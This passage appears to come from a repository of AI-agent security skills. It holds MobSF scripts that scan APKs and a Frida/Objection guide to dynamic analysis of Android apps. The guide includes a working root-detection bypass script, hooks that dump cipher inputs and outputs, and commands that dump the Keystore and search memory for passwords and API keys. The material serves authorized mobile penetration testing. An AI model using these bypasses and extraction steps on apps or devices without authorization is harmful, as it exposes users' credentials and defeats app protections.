            files={"file": (os.path.basename(apk_path), f, "application/octet-stream")},
            headers=headers,
            timeout=300,
        )
    resp.raise_for_status()
    data = resp.json()
    file_hash = data.get("hash", "")
    scan_type = data.get("scan_type", "apk")
    file_name = data.get("file_name", os.path.basename(apk_path))
    print(f"[+] Uploaded: {file_name} (hash: {file_hash}, type: {scan_type})")
    return file_hash, scan_type, file_name


def start_scan(server, api_key, file_hash, scan_type, file_name):
    """Trigger static analysis scan on the uploaded APK."""
    url = f"{server}/api/v1/scan"
    headers = {"Authorization": api_key}
    print(f"[*] Starting static analysis scan for {file_name}...")
    resp = requests.post(
        url,
        data={"hash": file_hash, "scan_type": scan_type, "file_name": file_name},
        headers=headers,
        timeout=600,
    )
    resp.raise_for_status()
    print("[+] Scan complete")
    return resp.json()


def get_report(server, api_key, file_hash):
    """Retrieve the JSON report for a scanned APK."""
    url = f"{server}/api/v1/report_json"
    headers = {"Authorization": api_key}
    resp = requests.post(
        url,
        data={"hash": file_hash},
        headers=headers,
        timeout=120,
    )
    resp.raise_for_status()
    return resp.json()


def get_scorecard(server, api_key, file_hash):
    """Retrieve the security scorecard for a scanned APK."""
    url = f"{server}/api/v1/scorecard"
    headers = {"Authorization": api_key}
    resp = requests.post(
        url,
        data={"hash": file_hash},
        headers=headers,
        timeout=60,
    )
    resp.raise_for_status()
    return resp.json()


def extract_findings(report):
    """Extract structured security findings from MobSF report JSON."""
    findings = []

    # Manifest analysis
    for item in report.get("manifest_analysis", []):
        findings.append({
            "category": "manifest",
            "title": item.get("title", "Unknown"),
            "severity": item.get("severity", "info").upper(),
            "description": item.get("description", ""),
        })

    # Code analysis
    code_analysis = report.get("code_analysis", {})
    if isinstance(code_analysis, dict):
        for key, value in code_analysis.items():
            if isinstance(value, dict):
                findings.append({
                    "category": "code",
                    "title": value.get("metadata", {}).get("description", key),
                    "severity": value.get("metadata", {}).get("severity", "info").upper(),
                    "description": value.get("metadata", {}).get("cwe", ""),
                    "files": list(value.get("files", {}).keys())[:5],
                })

    # Binary analysis
    for item in report.get("binary_analysis", []):
        findings.append({
            "category": "binary",
            "title": item.get("name", "Unknown"),
            "severity": item.get("severity", "info").upper(),
            "description": item.get("description", ""),
        })

    # Certificate analysis
    cert_info = report.get("certificate_analysis", {})
    if isinstance(cert_info, dict):
        cert_findings = cert_info.get("certificate_findings", [])
        for item in cert_findings:
            findings.append({
                "category": "certificate",
                "title": item.get("title", "Certificate finding"),
                "severity": item.get("severity", "info").upper(),
                "description": item.get("description", ""),
            })

    # Permissions
    permissions = report.get("permissions", {})
    dangerous_perms = []
    if isinstance(permissions, dict):
        for perm, details in permissions.items():
            if isinstance(details, dict) and details.get("status") == "dangerous":
                dangerous_perms.append(perm)
    if dangerous_perms:
        findings.append({
            "category": "permissions",
            "title": f"{len(dangerous_perms)} dangerous permissions declared",
            "severity": "WARNING",
            "description": ", ".join(dangerous_perms[:10]),
        })

    return findings


def format_summary(report, findings):
    """Print a human-readable summary of the analysis."""
    app_name = report.get("app_name", "Unknown")
    package = report.get("package_name", "Unknown")
    version = report.get("version_name", "Unknown")
    sdk_min = report.get("min_sdk", "?")
    sdk_target = report.get("target_sdk", "?")
    security_score = report.get("security_score", "N/A")

    print(f"\n{'='*60}")
    print(f"  MobSF Static Analysis Report")
    print(f"{'='*60}")
    print(f"  App Name    : {app_name}")
    print(f"  Package     : {package}")
    print(f"  Version     : {version}")
    print(f"  Min SDK     : {sdk_min} | Target SDK: {sdk_target}")
    print(f"  Security    : {security_score}/100")
    print(f"{'='*60}")

    severity_counts = {}
    for f in findings:
        sev = f.get("severity", "INFO")
        severity_counts[sev] = severity_counts.get(sev, 0) + 1

    print(f"\n  Findings Summary:")
    for sev in ["CRITICAL", "HIGH", "WARNING", "MEDIUM", "INFO", "LOW"]:
        if sev in severity_counts:
            print(f"    {sev:10s}: {severity_counts[sev]}")

    print(f"\n  Top Findings:")
    high_findings = [f for f in findings if f.get("severity") in ("CRITICAL", "HIGH", "WARNING")]
    for f in high_findings[:10]:
        print(f"    [{f['severity']:8s}] [{f['category']:12s}] {f['title']}")

    return severity_counts


def main():
    parser = argparse.ArgumentParser(
        description="MobSF Android static analysis agent - upload, scan, and report"
    )
    parser.add_argument("--apk", required=True, help="Path to the APK file to analyze")
    parser.add_argument("--output", "-o", help="Output JSON report path")
    parser.add_argument("--server", help="MobSF server URL (or set MOBSF_URL env var)")
    parser.add_argument("--api-key", help="MobSF API key (or set MOBSF_API_KEY env var)")
    parser.add_argument("--hash", help="Skip upload; use existing hash to retrieve report")
    parser.add_argument("--verbose", "-v", action="store_true", help="Verbose output")
    args = parser.parse_args()

    if args.server:
        os.environ["MOBSF_URL"] = args.server
    if args.api_key:
        os.environ["MOBSF_API_KEY"] = args.api_key

    server, api_key = get_mobsf_config()

    if args.hash:
        file_hash = args.hash
        print(f"[*] Using existing hash: {file_hash}")
    else:
        file_hash, scan_type, file_name = upload_apk(server, api_key, args.apk)
        start_scan(server, api_key, file_hash, scan_type, file_name)

    report = get_report(server, api_key, file_hash)
    findings = extract_findings(report)
    severity_counts = format_summary(report, findings)

    output_report = {
        "timestamp": datetime.now(timezone.utc).isoformat(),
        "tool": "MobSF",
        "apk": args.apk,
        "app_name": report.get("app_name", ""),
        "package_name": report.get("package_name", ""),
        "version": report.get("version_name", ""),
        "security_score": report.get("security_score", 0),
        "severity_counts": severity_counts,
        "findings": findings,
        "risk_level": (
            "CRITICAL" if severity_counts.get("CRITICAL", 0) > 0
            else "HIGH" if severity_counts.get("HIGH", 0) > 0
            else "MEDIUM" if severity_counts.get("WARNING", 0) > 0
            else "LOW"
        ),
    }

    if args.output:
        with open(args.output, "w") as f:
            json.dump(output_report, f, indent=2)
        print(f"\n[+] Report saved to {args.output}")
    elif args.verbose:
        print(json.dumps(output_report, indent=2))

    print(f"\n[*] Risk Level: {output_report['risk_level']}")


if __name__ == "__main__":
    main()

===== END FILE =====


===== FILE: skills/performing-android-app-static-analysis-with-mobsf/scripts/process.py =====
#!/usr/bin/env python3
"""
MobSF Automated Static Analysis Pipeline

Automates APK upload, scanning, and report generation via MobSF REST API.
Designed for CI/CD integration with configurable security score thresholds.

Usage:
    python process.py --apk target.apk --api-key <KEY> [--threshold 60] [--output report.json]
"""

import argparse
import json
import sys
import time
import hashlib
from pathlib import Path
from urllib.parse import urljoin

try:
    import requests
except ImportError:
    print("ERROR: 'requests' package required. Install with: pip install requests")
    sys.exit(1)


class MobSFScanner:
    """Interfaces with MobSF REST API for automated static analysis."""

    def __init__(self, base_url: str, api_key: str):
        self.base_url = base_url.rstrip("/")
        self.api_key = api_key
        self.session = requests.Session()
        self.session.headers.update({"Authorization": api_key})

    def upload_apk(self, apk_path: str) -> dict:
        """Upload APK file to MobSF for analysis."""
        endpoint = f"{self.base_url}/api/v1/upload"
        apk_file = Path(apk_path)

        if not apk_file.exists():
            raise FileNotFoundError(f"APK not found: {apk_path}")

        if not apk_file.suffix.lower() in (".apk", ".aab", ".zip", ".ipa"):
            raise ValueError(f"Unsupported file type: {apk_file.suffix}")

        with open(apk_path, "rb") as f:
            files = {"file": (apk_file.name, f, "application/octet-stream")}
            response = self.session.post(endpoint, files=files)

        response.raise_for_status()
        result = response.json()
        print(f"[+] Uploaded: {apk_file.name} (hash: {result.get('hash', 'N/A')})")
        return result

    def run_static_scan(self, file_hash: str, file_name: str, scan_type: str = "apk") -> dict:
        """Trigger static analysis scan."""
        endpoint = f"{self.base_url}/api/v1/scan"
        data = {
            "scan_type": scan_type,
            "file_name": file_name,
            "hash": file_hash,
        }
        response = self.session.post(endpoint, data=data)
        response.raise_for_status()
        print(f"[+] Static scan completed for: {file_name}")
        return response.json()

    def get_report_json(self, file_hash: str) -> dict:
        """Retrieve JSON scan report."""
        endpoint = f"{self.base_url}/api/v1/report_json"
        data = {"hash": file_hash}
        response = self.session.post(endpoint, data=data)
        response.raise_for_status()
        return response.json()

    def get_scorecard(self, file_hash: str) -> dict:
        """Retrieve security scorecard."""
        endpoint = f"{self.base_url}/api/v1/scorecard"
        data = {"hash": file_hash}
        response = self.session.post(endpoint, data=data)
        response.raise_for_status()
        return response.json()

    def download_pdf_report(self, file_hash: str, output_path: str) -> str:
        """Download PDF report."""
        endpoint = f"{self.base_url}/api/v1/download_pdf"
        data = {"hash": file_hash}
        response = self.session.post(endpoint, data=data)
        response.raise_for_status()

        with open(output_path, "wb") as f:
            f.write(response.content)
        print(f"[+] PDF report saved: {output_path}")
        return output_path


def extract_critical_findings(report: dict) -> dict:
    """Extract and categorize critical findings from MobSF report."""
    findings = {
        "manifest_issues": [],
        "code_issues": [],
        "network_issues": [],
        "binary_issues": [],
        "crypto_issues": [],
    }

    # Manifest analysis
    manifest = report.get("manifest_analysis", [])
    if isinstance(manifest, list):
        for item in manifest:
            severity = item.get("stat", item.get("severity", "info"))
            if severity.lower() in ("high", "warning"):
                findings["manifest_issues"].append({
                    "title": item.get("title", "Unknown"),
                    "description": item.get("desc", item.get("description", "")),
                    "severity": severity,
                })

    # Code analysis
    code_analysis = report.get("code_analysis", {})
    if isinstance(code_analysis, dict):
        for category, items in code_analysis.items():
            if isinstance(items, dict):
                metadata = items.get("metadata", {})
                severity = metadata.get("severity", "info")
                if severity.lower() in ("high", "warning"):
                    findings["code_issues"].append({
                        "category": category,
                        "description": metadata.get("description", ""),
                        "severity": severity,
                        "files": list(items.get("files", {}).keys())[:5],
                    })

    # Network security
    network = report.get("network_security", [])
    if isinstance(network, list):
        for item in network:
            severity = item.get("severity", "info")
            if severity.lower() in ("high", "warning"):
                findings["network_issues"].append({
                    "title": item.get("scope", "Unknown"),
                    "description": item.get("description", ""),
                    "severity": severity,
                })

    return findings


def evaluate_security_score(scorecard: dict, threshold: int) -> bool:
    """Evaluate whether the app meets the minimum security threshold."""
    score = scorecard.get("security_score", 0)
    print(f"\n[*] Security Score: {score}/100 (threshold: {threshold})")

    if score >= threshold:
        print("[+] PASS: Application meets minimum security threshold")
        return True
    else:
        print("[-] FAIL: Application does not meet minimum security threshold")
        return False


def main():
    parser = argparse.ArgumentParser(
        description="MobSF Automated Static Analysis Pipeline"
    )
    parser.add_argument("--apk", required=True, help="Path to APK/AAB file")
    parser.add_argument("--api-key", required=True, help="MobSF REST API key")
    parser.add_argument(
        "--url", default="http://localhost:8000", help="MobSF server URL"
    )
    parser.add_argument(
        "--threshold", type=int, default=60, help="Minimum security score (0-100)"
    )
    parser.add_argument("--output", default="mobsf_report.json", help="Output report path")
    parser.add_argument("--pdf", help="Optional PDF report output path")
    parser.add_argument(
        "--ci-mode", action="store_true", help="Exit with non-zero code on failure"
    )
    args = parser.parse_args()

    scanner = MobSFScanner(args.url, args.api_key)

    # Upload
    upload_result = scanner.upload_apk(args.apk)
    file_hash = upload_result["hash"]
    file_name = Path(args.apk).name
    scan_type = "apk" if file_name.endswith(".apk") else "aab"

    # Scan
    scanner.run_static_scan(file_hash, file_name, scan_type)

    # Get reports
    report = scanner.get_report_json(file_hash)
    scorecard = scanner.get_scorecard(file_hash)

    # Extract findings
    critical_findings = extract_critical_findings(report)

    # Build summary
    summary = {
        "file": file_name,
        "hash": file_hash,
        "security_score": scorecard.get("security_score", 0),
        "threshold": args.threshold,
        "pass": scorecard.get("security_score", 0) >= args.threshold,
        "findings_summary": {
            "manifest_issues": len(critical_findings["manifest_issues"]),
            "code_issues": len(critical_findings["code_issues"]),
            "network_issues": len(critical_findings["network_issues"]),
            "binary_issues": len(critical_findings["binary_issues"]),
            "crypto_issues": len(critical_findings["crypto_issues"]),
        },
        "critical_findings": critical_findings,
    }

    # Save JSON report
    with open(args.output, "w") as f:
        json.dump(summary, f, indent=2)
    print(f"[+] Report saved: {args.output}")

    # Optional PDF
    if args.pdf:
        scanner.download_pdf_report(file_hash, args.pdf)

    # Evaluate
    passed = evaluate_security_score(scorecard, args.threshold)

    if args.ci_mode and not passed:
        sys.exit(1)


if __name__ == "__main__":
    main()

===== END FILE =====


===== FILE: skills/performing-dynamic-analysis-of-android-app/SKILL.md =====
---
name: performing-dynamic-analysis-of-android-app
description: 'Performs runtime dynamic analysis of Android applications using Frida,
  Objection, and Android Debug Bridge to observe application behavior during execution,
  intercept function calls, modify runtime values, and identify vulnerabilities that
  static analysis misses. Use when testing Android apps for runtime security flaws,
  hooking sensitive methods, bypassing client-side protections, or analyzing obfuscated
  applications. Activates for requests involving Android dynamic analysis, runtime
  hooking, Frida Android instrumentation, or live app behavior analysis.

  '
domain: cybersecurity
subdomain: mobile-security
author: mahipal
tags:
- mobile-security
- android
- frida
- dynamic-analysis
- owasp-mobile
- penetration-testing
version: 1.0.0
license: Apache-2.0
nist_csf:
- PR.PS-01
- PR.AA-05
- ID.RA-01
- DE.CM-09
mitre_attack:
- T1059
- T1056
- T1036
- T1078
- T1027
---
# Performing Dynamic Analysis of Android App

## When to Use

Use this skill when:
- Static analysis results need runtime validation on an actual Android device
- The target app uses obfuscation (DexGuard, custom packers) that prevents effective static analysis
- Testing requires observing actual API calls, decrypted data, or runtime-generated values
- Assessing root detection, tamper detection, or anti-debugging implementations

**Do not use** this skill on production environments without authorization -- dynamic instrumentation can alter app behavior and trigger security alerts.

## Prerequisites

- Rooted Android device or emulator (Genymotion, Android Studio AVD with writable system)
- Frida server installed on device matching the architecture (arm64, x86_64)
- Python 3.10+ with `frida-tools` and `objection` packages
- ADB configured and device connected
- Target APK installed on device

## Workflow

### Step 1: Setup Frida Server on Android Device

```bash
# Check device architecture
adb shell getprop ro.product.cpu.abi
# Output: arm64-v8a

# Download matching Frida server from GitHub releases
# https://github.com/frida/frida/releases
# Push to device
adb push frida-server-16.x.x-android-arm64 /data/local/tmp/frida-server
adb shell chmod 755 /data/local/tmp/frida-server
adb shell /data/local/tmp/frida-server &

# Verify Frida connection
frida-ps -U
```

### Step 2: Enumerate Application Attack Surface

```bash
# List all packages
frida-ps -U -a

# Attach Objection for high-level exploration
objection --gadget com.target.app explore

# List activities, services, receivers
android hooking list activities
android hooking list services
android hooking list receivers

# List loaded classes
android hooking list classes
android hooking search classes com.target.app
```

### Step 3: Hook Sensitive Methods

```bash
# Hook all methods of a class
android hooking watch class com.target.app.auth.LoginManager

# Hook specific method with argument dumping
android hooking watch class_method com.target.app.auth.LoginManager.authenticate --dump-args --dump-return

# Hook crypto operations
android hooking watch class javax.crypto.Cipher --dump-args
android hooking watch class java.security.MessageDigest --dump-args

# Hook network calls
android hooking watch class okhttp3.OkHttpClient --dump-args
android hooking watch class java.net.URL --dump-args
```

### Step 4: Write Custom Frida Scripts for Deep Analysis

```javascript
// hook_crypto.js - Intercept encryption/decryption operations
Java.perform(function() {
    var Cipher = Java.use("javax.crypto.Cipher");

    Cipher.doFinal.overload("[B").implementation = function(input) {
        var mode = this.getAlgorithm();
        console.log("[Cipher] Algorithm: " + mode);
        console.log("[Cipher] Input: " + bytesToHex(input));

        var result = this.doFinal(input);
        console.log("[Cipher] Output: " + bytesToHex(result));
        return result;
    };

    function bytesToHex(bytes) {
        var hex = [];
        for (var i = 0; i < bytes.length; i++) {
            hex.push(("0" + (bytes[i] & 0xFF).toString(16)).slice(-2));
        }
        return hex.join("");
    }
});
```

```bash
# Execute custom Frida script
frida -U -f com.target.app -l hook_crypto.js --no-pause
```

### Step 5: Bypass Root Detection

```javascript
// root_bypass.js - Common root detection bypass
Java.perform(function() {
    // Bypass RootBeer library
    var RootBeer = Java.use("com.scottyab.rootbeer.RootBeer");
    RootBeer.isRooted.implementation = function() {
        console.log("[RootBeer] isRooted() bypassed");
        return false;
    };

    // Bypass generic file-based root checks
    var File = Java.use("java.io.File");
    var originalExists = File.exists;
    File.exists.implementation = function() {
        var path = this.getAbsolutePath();
        var rootPaths = ["/system/app/Superuser.apk", "/system/xbin/su",
                         "/sbin/su", "/system/bin/su", "/data/local/bin/su"];
        if (rootPaths.indexOf(path) >= 0) {
            console.log("[Root] Blocked check for: " + path);
            return false;
        }
        return originalExists.call(this);
    };

    // Bypass SafetyNet/Play Integrity
    try {
        var SafetyNet = Java.use("com.google.android.gms.safetynet.SafetyNetApi");
        console.log("[SafetyNet] Class found - may need additional bypass");
    } catch(e) {}
});
```

### Step 6: Analyze Network Communication at Runtime

```javascript
// network_monitor.js - Monitor all HTTP requests
Java.perform(function() {
    // Hook OkHttp3
    try {
        var OkHttpClient = Java.use("okhttp3.OkHttpClient");
        var Interceptor = Java.use("okhttp3.Interceptor");
        var Chain = Java.use("okhttp3.Interceptor$Chain");

        console.log("[OkHttp] Monitoring network requests...");

        var Request = Java.use("okhttp3.Request");
        Request.url.implementation = function() {
            var url = this.url();
            console.log("[OkHttp] URL: " + url.toString());
            return url;
        };
    } catch(e) {
        console.log("[OkHttp] Not found, trying HttpURLConnection");
    }

    // Hook HttpURLConnection
    var URL = Java.use("java.net.URL");
    URL.openConnection.overload().implementation = function() {
        console.log("[URL] Opening: " + this.toString());
        return this.openConnection();
    };
});
```

### Step 7: Extract Decrypted Data and Secrets

```bash
# Using Objection for quick extraction
objection --gadget com.target.app explore

# Dump Android Keystore entries
android keystore list
android keystore dump

# Search heap for sensitive objects
android heap search instances com.target.app.model.User
android heap evaluate <handle> "JSON.stringify(clazz)"

# Memory string search
memory search "password" --string
memory search "api_key" --string
```

## Key Concepts

| Term | Definition |
|------|-----------|
| **Dynamic Instrumentation** | Modifying application behavior at runtime by injecting code into the running process |
| **Method Hooking** | Replacing or wrapping function implementations to intercept arguments and return values |
| **Frida Server** | Daemon running on the target device that receives instrumentation commands from the host |
| **Dalvik/ART Runtime** | Android runtime environments; Frida hooks at the ART level for Java/Kotlin methods |
| **Heap Inspection** | Examining live objects in the application's memory heap to extract runtime data |

## Tools & Systems

- **Frida**: Dynamic instrumentation toolkit for injecting JavaScript into native Android processes
- **Objection**: Higher-level Frida wrapper with pre-built Android and iOS security testing commands
- **frida-trace**: Automated method tracing utility for quick reconnaissance of app behavior
- **Drozer**: Android security assessment framework for testing IPC and exported components
- **Android Studio Profiler**: Runtime monitoring for CPU, memory, and network activity

## Common Pitfalls

- **Frida version mismatch**: The Frida server on the device must match the frida-tools version on the host. Version mismatches cause connection failures.
- **Anti-Frida detection**: Some apps detect Frida by checking for the Frida server process, scanning memory for Frida signatures, or monitoring `/proc/self/maps`. Use Frida Gadget injection or custom server builds.
- **Obfuscated class names**: When ProGuard/R8 is applied, class and method names are shortened (e.g., `a.b.c.d()`). Use `android hooking search classes` to discover actual runtime names.
- **Multi-DEX apps**: Large apps split across multiple DEX files may not have all classes loaded at startup. Hook class loaders or use `Java.enumerateLoadedClasses()` after app is fully initialized.

===== END FILE =====


===== FILE: skills/performing-dynamic-analysis-of-android-app/LICENSE =====

                                 Apache License
                           Version 2.0, January 2004
                        http://www.apache.org/licenses/

   TERMS AND CONDITIONS FOR USE, REPRODUCTION, AND DISTRIBUTION

   1. Definitions.

      "License" shall mean the terms and conditions for use, reproduction,
      and distribution as defined by Sections 1 through 9 of this document.

      "Licensor" shall mean the copyright owner or entity authorized by
      the copyright owner that is granting the License.

      "Legal Entity" shall mean the union of the acting entity and all
      other entities that control, are controlled by, or are under common
      control with that entity. For the purposes of this definition,
      "control" means (i) the power, direct or indirect, to cause the
      direction or management of such entity, whether by contract or
      otherwise, or (ii) ownership of fifty percent (50%) or more of the
      outstanding shares, or (iii) beneficial ownership of such entity.

      "You" (or "Your") shall mean an individual or Legal Entity
      exercising permissions granted by this License.

      "Source" form shall mean the preferred form for making modifications,
      including but not limited to software source code, documentation
      source, and configuration files.

      "Object" form shall mean any form resulting from mechanical
      transformation or translation of a Source form, including but
      not limited to compiled object code, generated documentation,
      and conversions to other media types.

      "Work" shall mean the work of authorship, whether in Source or
      Object form, made available under the License, as indicated by a
      copyright notice that is included in or attached to the work
      (an example is provided in the Appendix below).

      "Derivative Works" shall mean any work, whether in Source or Object
      form, that is based on (or derived from) the Work and for which the
      editorial revisions, annotations, elaborations, or other modifications
      represent, as a whole, an original work of authorship. For the purposes
      of this License, Derivative Works shall not include works that remain
      separable from, or merely link (or bind by name) to the interfaces of,
      the Work and Derivative Works thereof.

      "Contribution" shall mean any work of authorship, including
      the original version of the Work and any modifications or additions
      to that Work or Derivative Works thereof, that is intentionally
      submitted to the Licensor for inclusion in the Work by the copyright owner
      or by an individual or Legal Entity authorized to submit on behalf of
      the copyright owner. For the purposes of this definition, "submitted"
      means any form of electronic, verbal, or written communication sent
      to the Licensor or its representatives, including but not limited to
      communication on electronic mailing lists, source code control systems,
      and issue tracking systems that are managed by, or on behalf of, the
      Licensor for the purpose of discussing and improving the Work, but
      excluding communication that is conspicuously marked or otherwise
      designated in writing by the copyright owner as "Not a Contribution."

      "Contributor" shall mean Licensor and any individual or Legal Entity
      on behalf of whom a Contribution has been received by the Licensor and
      subsequently incorporated within the Work.

   2. Grant of Copyright License. Subject to the terms and conditions of
      this License, each Contributor hereby grants to You a perpetual,
      worldwide, non-exclusive, no-charge, royalty-free, irrevocable
      copyright license to reproduce, prepare Derivative Works of,
      publicly display, publicly perform, sublicense, and distribute the
      Work and such Derivative Works in Source or Object form.

   3. Grant of Patent License. Subject to the terms and conditions of
      this License, each Contributor hereby grants to You a perpetual,
      worldwide, non-exclusive, no-charge, royalty-free, irrevocable
      (except as stated in this section) patent license to make, have made,
      use, offer to sell, sell, import, and otherwise transfer the Work,
      where such license applies only to those patent claims licensable
      by such Contributor that are necessarily infringed by their
      Contribution(s) alone or by combination of their Contribution(s)
      with the Work to which such Contribution(s) was submitted. If You
      institute patent litigation against any entity (including a
      cross-claim or counterclaim in a lawsuit) alleging that the Work
      or a Contribution incorporated within the Work constitutes direct
      or contributory patent infringement, then any patent licenses
      granted to You under this License for that Work shall terminate
      as of the date such litigation is filed.

   4. Redistribution. You may reproduce and distribute copies of the
      Work or Derivative Works thereof in any medium, with or without
      modifications, and in Source or Object form, provided that You
      meet the following conditions:

      (a) You must give any other recipients of the Work or
          Derivative Works a copy of this License; and

      (b) You must cause any modified files to carry prominent notices
          stating that You changed the files; and

      (c) You must retain, in the Source form of any Derivative Works
          that You distribute, all copyright, patent, trademark, and
          attribution notices from the Source form of the Work,
          excluding those notices that do not pertain to any part of
          the Derivative Works; and

      (d) If the Work includes a "NOTICE" text file as part of its
          distribution, then any Derivative Works that You distribute must
          include a readable copy of the attribution notices contained
          within such NOTICE file, excluding any notices that do not
          pertain to any part of the Derivative Works, in at least one
          of the following places: within a NOTICE text file distributed
          as part of the Derivative Works; within the Source form or
          documentation, if provided along with the Derivative Works; or,
          within a display generated by the Derivative Works, if and
          wherever such third-party notices normally appear. The contents
          of the NOTICE file are for informational purposes only and
          do not modify the License. You may add Your own attribution
          notices within Derivative Works that You distribute, alongside
          or as an addendum to the NOTICE text from the Work, provided
          that such additional attribution notices cannot be construed
          as modifying the License.

      You may add Your own copyright statement to Your modifications and
      may provide additional or different license terms and conditions
      for use, reproduction, or distribution of Your modifications, or
      for any such Derivative Works as a whole, provided Your use,
      reproduction, and distribution of the Work otherwise complies with
      the conditions stated in this License.

   5. Submission of Contributions. Unless You explicitly state otherwise,
      any Contribution intentionally submitted for inclusion in the Work
      by You to the Licensor shall be under the terms and conditions of
      this License, without any additional terms or conditions.
      Notwithstanding the above, nothing herein shall supersede or modify
      the terms of any separate license agreement you may have executed
      with Licensor regarding such Contributions.

   6. Trademarks. This License does not grant permission to use the trade
      names, trademarks, service marks, or product names of the Licensor,
      except as required for reasonable and customary use in describing the
      origin of the Work and reproducing the content of the NOTICE file.

   7. Disclaimer of Warranty. Unless required by applicable law or
      agreed to in writing, Licensor provides the Work (and each
      Contributor provides its Contributions) on an "AS IS" BASIS,
      WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or
      implied, including, without limitation, any warranties or conditions
      of TITLE, NON-INFRINGEMENT, MERCHANTABILITY, or FITNESS FOR A
      PARTICULAR PURPOSE. You are solely responsible for determining the
      appropriateness of using or redistributing the Work and assume any
      risks associated with Your exercise of permissions under this License.

   8. Limitation of Liability. In no event and under no legal theory,
      whether in tort (including negligence), contract, or otherwise,
      unless required by applicable law (such as deliberate and grossly
      negligent acts) or agreed to in writing, shall any Contributor be
      liable to You for damages, including any direct, indirect, special,
      incidental, or consequential damages of any character arising as a
      result of this License or out of the use or inability to use the
      Work (including but not limited to damages for loss of goodwill,
      work stoppage, computer failure or malfunction, or any and all
      other commercial damages or losses), even if such Contributor
      has been advised of the possibility of such damages.

   9. Accepting Warranty or Additional Liability. While redistributing
      the Work or Derivative Works thereof, You may choose to offer,
      and charge a fee for, acceptance of support, warranty, indemnity,
      or other liability obligations and/or rights consistent with this
      License. However, in accepting such obligations, You may act only
      on Your own behalf and on Your sole responsibility, not on behalf
      of any other Contributor, and only if You agree to indemnify,
      defend, and hold each Contributor harmless for any liability
      incurred by, or claims asserted against, such Contributor by reason
      of your accepting any such warranty or additional liability.

   END OF TERMS AND CONDITIONS

   APPENDIX: How to apply the Apache License to your work.

      To apply the Apache License to your work, attach the following
      boilerplate notice, with the fields enclosed by brackets "[]"
      replaced with your own identifying information. (Don't include
      the brackets!)  The text should be enclosed in the appropriate
      comment syntax for the file format. Please do not remove or change
      the license header comment from a contributed file except when
      necessary.

   Copyright 2026 mukul975

   Licensed under the Apache License, Version 2.0 (the "License");
   you may not use this file except in compliance with the License.
   You may obtain a copy of the License at

       http://www.apache.org/licenses/LICENSE-2.0

   Unless required by applicable law or agreed to in writing, software
   distributed under the License is distributed on an "AS IS" BASIS,
   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
   See the License for the specific language governing permissions and
   limitations under the License.

===== END FILE =====


===== FILE: skills/performing-dynamic-analysis-of-android-app/assets/template.md =====
# Android Dynamic Analysis Report

## Target Application

| Field | Value |
|-------|-------|
| Package Name | [PACKAGE] |
| Version | [VERSION] |
| Target SDK | [SDK] |
| Device | [MODEL] / Android [VERSION] |
| Rooted | [YES/NO] |
| Analysis Date | [DATE] |

## Component Enumeration

| Type | Count | Exported | Notable |
|------|-------|----------|---------|
| Activities | [N] | [N] | [DETAILS] |
| Services | [N] | [N] | [DETAILS] |
| Receivers | [N] | [N] | [DETAILS] |
| Providers | [N] | [N] | [DETAILS] |

## Runtime Security Findings

### Finding [N]: [TITLE]
- **Severity**: [LEVEL]
- **OWASP Mobile**: [M-ID]
- **Category**: [MASVS-CATEGORY]
- **Description**: [DESCRIPTION]
- **Evidence**: [RUNTIME_OUTPUT]
- **Recommendation**: [REMEDIATION]

## Protection Assessment

| Protection | Status | Bypass Difficulty |
|-----------|--------|------------------|
| Root Detection | [Present/Absent] | [Easy/Medium/Hard] |
| SSL Pinning | [Present/Absent] | [Easy/Medium/Hard] |
| Frida Detection | [Present/Absent] | [Easy/Medium/Hard] |
| Debug Detection | [Present/Absent] | [Easy/Medium/Hard] |
| Emulator Detection | [Present/Absent] | [Easy/Medium/Hard] |
| Tamper Detection | [Present/Absent] | [Easy/Medium/Hard] |

## Recommendations

1. [RECOMMENDATION]

===== END FILE =====


===== FILE: skills/performing-dynamic-analysis-of-android-app/references/api-reference.md =====
# API Reference — Performing Dynamic Analysis of Android App

## Libraries Used
- **frida**: Dynamic instrumentation for runtime hooking and SSL pinning detection
- **subprocess**: ADB commands for package management, traffic capture, component analysis

## CLI Interface

```
python agent.py [--device <id>] packages
python agent.py [--device <id>] ssl --package <pkg>
python agent.py [--device <id>] components --package <pkg>
python agent.py [--device <id>] storage --package <pkg>
python agent.py [--device <id>] network [--duration 30]
```

## Core Functions

### `check_ssl_pinning(package_name, device_id)`
Uses Frida to hook TrustManagerImpl and OkHostnameVerifier to detect SSL pinning.

### `analyze_exported_components(package_name, device_id)`
Runs `dumpsys package` to enumerate exported activities, services, receivers, providers.

### `check_data_storage(package_name, device_id)`
Checks shared_prefs and world-readable files via `run-as` for insecure storage.

### `capture_network_traffic(device_id, duration, output)`
Runs `tcpdump` on device and pulls pcap via ADB.

## Frida API Calls
- `frida.get_usb_device()` — Connect to USB device
- `device.spawn([package])` — Launch app
- `session.create_script(js)` — Inject JavaScript
- `script.on("message", callback)` — Receive hook results

## Dependencies
```
pip install frida frida-tools
# ADB must be installed and device connected
```

===== END FILE =====


===== FILE: skills/performing-dynamic-analysis-of-android-app/references/standards.md =====
# Standards Reference: Dynamic Analysis of Android App

## OWASP Mobile Top 10 2024 Mapping

| OWASP ID | Risk | Dynamic Analysis Coverage |
|----------|------|--------------------------|
| M1 | Improper Credential Usage | Intercept credentials at runtime, dump keystore |
| M3 | Insecure Authentication/Authorization | Hook auth methods, observe token generation |
| M5 | Insecure Communication | Monitor network calls, intercept decrypted payloads |
| M7 | Insufficient Binary Protections | Test root detection, Frida detection, tamper checks |
| M8 | Security Misconfiguration | Explore exported components, test IPC endpoints |
| M10 | Insufficient Cryptography | Hook Cipher/MessageDigest to observe crypto operations |

## OWASP MASVS v2.0 Control Mapping

| MASVS Category | Dynamic Test | Method |
|----------------|-------------|--------|
| MASVS-STORAGE | Runtime data extraction | Heap inspection, memory search |
| MASVS-CRYPTO | Algorithm observation | Hook javax.crypto.Cipher |
| MASVS-AUTH | Auth flow analysis | Hook login/token methods |
| MASVS-NETWORK | Traffic monitoring | Hook OkHttp, HttpURLConnection |
| MASVS-PLATFORM | IPC testing | Drozer, intent fuzzing |
| MASVS-RESILIENCE | Protection bypass | Root/Frida/debug detection bypass |

## OWASP MASTG Dynamic Test Cases

| Test ID | Description | Tool |
|---------|-------------|------|
| MASTG-TEST-0001 | Testing Local Storage (Runtime) | Objection, Frida |
| MASTG-TEST-0010 | Testing Custom URL Schemes | Frida hooks, ADB |
| MASTG-TEST-0013 | Testing WebView Security | Hook WebView methods |
| MASTG-TEST-0029 | Testing Root Detection | Frida bypass scripts |
